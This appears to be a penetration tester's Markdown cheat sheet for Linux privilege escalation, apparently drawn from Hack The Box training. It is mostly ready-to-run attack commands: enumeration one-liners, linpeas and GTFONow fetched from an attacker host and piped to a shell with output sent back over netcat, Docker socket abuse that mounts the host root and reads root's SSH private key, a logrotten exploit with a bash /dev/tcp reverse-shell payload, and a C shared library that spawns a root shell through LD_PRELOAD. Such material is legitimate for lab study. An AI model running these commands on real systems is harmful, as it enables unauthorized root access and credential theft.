# Useful commands

List Current Processes
```shell
ps aux | grep root
```

List available sudo privileges:
```shell
sudo -l
```

List available SUID files:
```shell
find / -perm /4000 2>/dev/null
```

Find Writable Directories
```shell
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Find Writable Files
```shell
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Find users with shell
```shell
grep "*sh$" /etc/passwd
```

Find sudo users
```shell
getent group sudo
```

Find all hidden files of user
```shell
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

Check for GTFO bins
```shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

Trace system calls
```shell
strace ping -c1 10.129.112.20
```
# Tools
## Linpeas
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

Excute from memory and send output back to the host

```shell
nc -lvnp 9002 | tee linpeas.out
```

```shell
curl 10.10.14.18/linpeas.sh | sh | nc 10.10.14.18 9002
```

## Linenum
[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

## Pspy
[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

## GTFONow
[https://github.com/Frissi0n/GTFONow](https://github.com/Frissi0n/GTFONow)

To use `GTFONow`, simply run the script from your command line. The basic syntax is as follows:

```shell
python gtfonow.py [OPTIONS]
```

It can also be run by piping the output of curl:

```shell
curl http://attacker.host/gtfonow.py | python
```

# Capabilities

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

| **Capability**     | **Desciption**                                                                                                                                                                                                               |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |
|                    |                                                                                                                                                                                                                              |
## Enumerating Capabilities

```shell
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

# Docker Privilege Escalation

## Docker Sockets

```shell
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86_64/docker) and upload it to the Docker container.

```shell
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```shell
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

## Docker Group

To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.

```shell
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

## Docker Socket

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shell
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var

```

# Logrotate

## Overview
`logrotate` is a tool for managing log files on Linux systems, preventing disk space overflow by archiving or disposing of old logs. It is configured via `/etc/logrotate.conf` and typically run through `cron`.

## Key Features
- **Size**: Manage log file size.
- **Age**: Set log file age limits.
- **Actions**: Define actions when limits are reached.

## Basic Commands
- **Help and Usage**:
  ```shell
  logrotate --help
  man logrotate
  ```

- **Force Rotation**:
  ```shell
  logrotate -f <configfile>
  ```

- **Debug Mode**:
  ```shell
  logrotate -d <configfile>
  ```

- **Verbose Output**:
  ```shell
  logrotate -v <configfile>
  ```

## Configuration
- **Global Settings** (`/etc/logrotate.conf`):
  ```shell
  # Rotate log files weekly
  weekly

  # Keep 4 weeks worth of backlogs
  rotate 4

  # Create new (empty) log files after rotating old ones
  create

  # Include additional configurations
  include /etc/logrotate.d
  ```

- **Example Configuration** (`/etc/logrotate.d/dpkg`):
  ```shell
  /var/log/dpkg.log {
      monthly
      rotate 12
      compress
      delaycompress
      missingok
      notifempty
      create 644 root root
  }
  ```

## Exploitation
1. **Requirements**:
   - Write permissions on log files.
   - `logrotate` must run as a privileged user.
   - Vulnerable versions: 3.8.6, 3.11.0, 3.15.0, 3.18.0.

2. **Exploit Setup**:
   - Clone and compile [logrotten](https://github.com/whotwagner/logrotten):
     ```shell
     git clone https://github.com/whotwagner/logrotten.git
     cd logrotten
     gcc logrotten.c -o logrotten
     ```

   - **Prepare Payload**:
     ```shell
     echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
     ```

   - **Start Listener**:
     ```shell
     nc -nlvp 9001
     ```

   - **Run Exploit**:
     ```shell
     ./logrotten -p ./payload /tmp/tmp.log
     ```

# LD_PRELOAD Privilege Escalation

Let's see an example of how we can utilize the [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.

```shell
sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

This user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can compile this as follows:

```shell
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.

```shell
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

